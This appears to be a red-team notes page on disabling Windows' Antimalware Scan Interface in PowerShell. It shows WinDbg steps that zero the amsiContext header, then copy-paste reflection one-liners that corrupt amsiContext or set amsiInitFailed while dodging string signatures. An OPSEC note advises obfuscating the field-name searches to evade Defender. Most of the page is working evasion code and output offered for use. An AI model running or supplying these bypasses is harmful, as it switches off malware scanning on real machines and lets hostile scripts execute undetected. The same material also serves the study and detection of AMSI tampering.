---
title: Bypassing AMSI With Reflection in PowerShell
draft: false
tags:
  - red-teaming
  - windows
  - amsi
  - powershell
  - evasion
  - reflection
---
 
# Abusing the AMSI Context Structure

## Manual

1. First, lets hook with Frida the Win32 API functions from AMSI.dll and check the address of the context structure (amsiContext):
```
27583730 ms  |- amsiContext: 0x1f862fa6f40
```

2. Open WinDbg attach to the PowerShell process, and dump the memory contents of the context structure
```bash
> dc 0x1f862fa6f40

000001f8`62fa6f40  "49534d41" 00000000 48efe1f0 000001f8  "AMSI".......H....
```

We can see that the first 4 bytes correspond to the ASCII representation of "AMSI".

3. Lets check the context structure in action in the AMSI APIs by unassembling the AmsiOpenSession function:
```bash
> u amsi!AmsiOpenSession

00007fff`c75c24ca 8139414d5349    cmp     dword ptr [rcx],"49534D41"h
00007fff`c75c24d0 7539            jne     amsi!AmsiOpenSession+0x4b (00007fff`c75c250b)
```

We can see that the contents of the memory location in RCX (first argument of a function) is being compared with the same bytes we found on the structure. The first argument of _AmsiOpenSession_ is exactly the context structure, so the function is checking the header of the structure. 

4. Then, we find a jump if not equal instruction. If the first bytes are not equal to "AMSI", it will jump to offset 0x4B inside the function. Lets check the instructions at that address:
```bash
> u amsi!AmsiOpenSession+0x4b

00007fff`c75c250b b857000780      mov     eax,80070057h
00007fff`c75c2510 c3              ret
```

EAX/RAX registers are used to store the return status code in a function. We know from the function that it returns a type HRESULT, and the value of 0x80070057 corresponds to the message text [_E_INVALIDARG_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8).

If the first four bytes of _amsiContext_ do not match the header values, _AmsiOpenSession_ will return an error.

5. Force an error by placing a breakpoint on the AmsiOpenSession and trigger it by placing a command in powershell:
```
> bp amsi!AmsiOpenSession

> g
```

6. Modify the first four bytes of the context structure:
```bash
> dc rcx L1

000001f8`62fa6f40  49534d41                             AMSI

> ed rcx 0

> dc rcx L1
000001f8`62fa6f40  00000000                             ....

> g

30024801 ms  [*] AmsiOpenSession()
30024801 ms  |- amsiContext: 0x1f862fa6f40
30024801 ms  |- amsiSession: 0x7fff37328268

30024803 ms  [*] AmsiOpenSession() Exit
30024803 ms  |- HRESULT value is: 0x80070057
```

We will see that AmsiOpenSession has exit with the error we mentioned previously. If we test a command flagged as malicious, we will see its not flagged anymore:
```powershell
PS C:\Users\Offsec> 'amsiutils'
amsiutils
```

## Automatic

**Option 1**

PowerShell stores information about AMSI in managed code inside the _System.Management.Automation.AmsiUtils_ class, which we can enumerate and interact with through reflection. This section will bypass AMSI via .NET reflection and dynamic filtering.

> [!Note]
> If we use a large number of AMSI trigger strings while testing may cause a "panic" in Windows Defender and it will suddenly consider everything malicious. At this point, the only remedy is to reboot the system.

If we try to obtain directly a reference to the class, we will be blocked by AMSI due to "AmsiUtils" string:
```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

1. To bypass this, we will loop through all classes and filter for the ones that have "iUtils" to get a handle to the _AmsiUtils_ class:
```powershell
PS C:\> $a=[Ref].Assembly.GetTypes()
PS C:\> Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
False    False    AmsiUtils                                System.Object
```

2. Next, we will enumerate all objects and variables contained in the class:
```powershell
PS C:\> $d=$c.GetFields('NonPublic,Static')

Name                   : amsiContext
```

3. Next, lets look for the amsiContext struct address. Because it contains the flagged word "amsi", we cannot reference it directly. Lets use the same technique:
```powershell
PS C:\> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
PS C:\> $f.GetValue($null)

1514420113440
```

This address is output in decimal. We have to transform it to hexadecimal. We can verify that the address belongs to the amsiContext struct by open and attach WinDbg and dump the memory address:
```bash
dc 0x1609A791020
00000160`9a791020  49534d41 00000000 806db190 00000160  AMSI......m.`...
```

4. Now lets overwrite the address with null bytes (0):
```powershell
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

We can verify it worked by opening WinDbg, forcing a break through _Debug_ > _Break_ and dumping the content of the _amsiContext_ buffer
```bash
> dc 0x1609A791020
00000160`9a791020  00000000 00000000 806db190 00000160  ..........m.`...
```

We can now enter any malicious command:
```powershell
PS C:\> amsiutils
```

- Onliner:
```powershell
PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

**Option 2**

The _amsiInitFailed_ field is verified by _AmsiOpenSession_ in the same manner as the _amsiContext_ header, which leads to an error:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Dynamic Filtering — amsiInitFailed (confirmed working approach)**

The `amsiInitFailed` field is a boolean inside the `AmsiUtils` class. Setting it to `$true` makes `AmsiOpenSession` treat AMSI as if it failed to initialise, disabling scanning for the session.

The direct reference (Option 2 above) is blocked because the string `"amsiInitFailed"` itself triggers AMSI. Apply the same dynamic-filter technique used for `amsiContext`:

```powershell
# Step 1 – get handle to AmsiUtils class without triggering AMSI
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) { if ($b.Name -like "*iUtils") { $c=$b } }

# Step 2 – enumerate non-public static fields and filter by "*InitFailed"
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) { if ($e.Name -like "*InitFailed") { $f=$e } }

# Step 3 – set the field to $true
$f.SetValue($null, $true)
```

One-liner:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*InitFailed"){$f=$e}};$f.SetValue($null,$true)
```

> [!Note]
> Unlike the `amsiContext` patch (which zeroes a memory pointer), this approach sets a managed field to `$true` — no `Marshal::Copy` needed. The effect is equivalent: `AmsiOpenSession` exits early with `E_INVALIDARG`.

> [!Warning]
> OPSEC: Both the `amsiContext` and `amsiInitFailed` patches are well-known and signatured. Microsoft Defender (2023+) monitors for reflection calls on `AmsiUtils` fields. Obfuscate field name searches (e.g., use `"*nitFail*"` or split the string) and consider using the binary-patching approach from [[Wrecking AMSI in PowerShell]] as an alternative.

---
# Wrecking AMSI in PowerShell

---
# Related Notes

- [[Antimalware Scan Interface (AMSI)]] — AMSI architecture and Frida tracing
- [[Wrecking AMSI in PowerShell]] — binary-patch AmsiOpenSession
- [[Bypassing AMSI in JScript]] — registry key + DLL bypass for JScript engine
- [[FodHelper UAC Bypass]] — download cradle using this AMSI bypass
- [[Reflective PowerShell]] — in-memory execution that needs AMSI bypassed first
